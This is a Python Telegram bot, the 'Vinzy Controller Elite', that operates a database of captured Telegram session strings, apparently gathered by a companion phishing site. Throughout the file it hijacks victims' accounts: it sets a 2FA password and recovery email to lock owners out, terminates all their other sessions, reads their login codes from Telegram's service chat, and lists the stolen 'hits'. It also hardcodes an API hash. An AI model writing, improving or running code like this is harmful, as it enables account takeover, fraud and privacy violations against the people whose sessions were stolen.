import os
import asyncio
import telebot
import psycopg2
import struct
import time
from telethon import TelegramClient, functions, types as tl_types, errors
from telethon.sessions import StringSession
from telebot import types

# --- 1. CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)

# --- 2. DATABASE LOGIC (SYNCED WITH GATEWAY) ---

def get_db_conn():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = get_db_conn()
    cur = conn.cursor()
    # Ensures we are using the same table as your app.py
    cur.execute('''
        CREATE TABLE IF NOT EXISTS moonton_secure_vault (
            phone TEXT PRIMARY KEY,
            session_string TEXT NOT NULL,
            ip_address TEXT,
            capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()

def get_session(phone):
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
    res = cur.fetchone()
    cur.close()
    conn.close()
    return res[0] if res else None

def get_all_phones():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("SELECT phone FROM moonton_secure_vault")
    res = cur.fetchall()
    cur.close()
    conn.close()
    return res

def delete_account(phone):
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("DELETE FROM moonton_secure_vault WHERE phone = %s", (phone,))
    conn.commit()
    rows = cur.rowcount
    cur.close()
    conn.close()
    return rows > 0

init_db()

# --- 3. CORE TELETHON RUNNER ---

async def run_task(phone, task_func, *args):
    session_str = get_session(phone)
    if not session_str:
        return f"❌ Phone <code>{phone}</code> not found in Vault."
    
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        await asyncio.wait_for(client.connect(), timeout=15)
        if not await client.is_user_authorized():
            return f"❌ Session for <code>{phone}</code> is revoked."
        return await task_func(client, *args)
    except Exception as e:
        return f"⚠️ Error: {str(e)}"
    finally:
        await client.disconnect()

# --- 4. COMMAND HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def cmd_help(m):
    if m.chat.id != GROUP_ID: return
    help_text = (
        "👑 <b>Vinzy Controller Elite</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "📡 <b>Database:</b>\n"
        "• <code>.list</code> - Show all hits\n"
        "• <code>.deleteauth [phone]</code>\n\n"
        "🔐 <b>2FA & Security:</b>\n"
        "• <code>.check2fa [phone]</code>\n"
        "• <code>.set2fa [phone] [pw]</code>\n"
        "• <code>.kickall [phone]</code>\n\n"
        "🕵️ <b>Stealth:</b>\n"
        "• <code>.getcode [phone]</code>\n"
        "• <code>.msg [phone] [user] [text]</code>\n"
        "• <code>.bio [phone] [text]</code>\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    accounts = get_all_phones()
    if not accounts: return bot.reply_to(m, "📭 Vault is empty.")
    msg = "📋 <b>Vaulted Accounts:</b>\n"
    for (phone,) in accounts:
        msg += f"• <code>{phone}</code>\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.check2fa'))
def cmd_check2fa(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 2: return bot.reply_to(m, "❌ Usage: <code>.check2fa [phone]</code>")
    
    phone = parts[1]
    async def logic(client):
        try:
            await client(functions.account.GetPasswordRequest())
            return f"🔐 <b>2FA ENABLED</b> for <code>{phone}</code>."
        except errors.PasswordHashInvalidError:
            return f"🔓 <b>NO 2FA</b> for <code>{phone}</code>."
    
    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.set2fa'))
def cmd_set2fa(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 3: return bot.reply_to(m, "❌ Usage: <code>.set2fa [phone] [pw]</code>")
    
    phone, pw = parts[1], parts[2]
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Yes", callback_data=f"em_y|{phone}|{pw}"),
               types.InlineKeyboardButton("❌ No", callback_data=f"em_n|{phone}|{pw}"))
    
    bot.send_message(m.chat.id, f"📧 Add Recovery Email for <code>{phone}</code>?", 
                     reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith('em_'))
def handle_2fa_choice(call):
    _, phone, pw = call.data.split('|')
    if call.data.startswith('em_y'):
        msg = bot.send_message(call.message.chat.id, "📧 Enter the Recovery Email:")
        bot.register_next_step_handler(msg, finalize_2fa, phone, pw)
    else:
        bot.edit_message_text("⏳ Setting 2FA (No Email)...", call.message.chat.id, call.message.message_id)
        res = asyncio.run(run_task(phone, logic_set_2fa, pw, None))
        bot.send_message(call.message.chat.id, res, parse_mode="HTML")

def finalize_2fa(m, phone, pw):
    res = asyncio.run(run_task(phone, logic_set_2fa, pw, m.text.strip()))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

async def logic_set_2fa(client, pw, email):
    try:
        p_info = await client(functions.account.GetPasswordRequest())
        await client(functions.account.UpdatePasswordSettingsRequest(
            password=p_info,
            new_settings=tl_types.account.PasswordInputSettings(
                new_algo=p_info.new_algo,
                new_password_hash=client.session.build_password_hash(p_info, pw),
                hint="System Security",
                email=email
            )
        ))
        return f"✅ <b>2FA Locked:</b> <code>{pw}</code>"
    except Exception as e: return f"⚠️ Failed: {str(e)}"

@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
def cmd_kickall(m):
    if m.chat.id != GROUP_ID: return
    phone = m.text.split(" ")[1]
    async def logic(client):
        await client(functions.auth.ResetAuthorizationsRequest())
        return f"⚡ <b>Kicked All Sessions</b> for <code>{phone}</code>."
    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
def cmd_getcode(m):
    if m.chat.id != GROUP_ID: return
    phone = m.text.split(" ")[1]
    async def logic(client):
        async for msg in client.iter_messages(777000, limit=1):
            return f"📩 <b>Code:</b>\n<code>{msg.text}</code>"
        return "📭 No code found."
    res = asyncio.run(run_task(phone, logic))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

if __name__ == "__main__":
    print("Vinzy Controller Elite is active...")
    bot.infinity_polling()
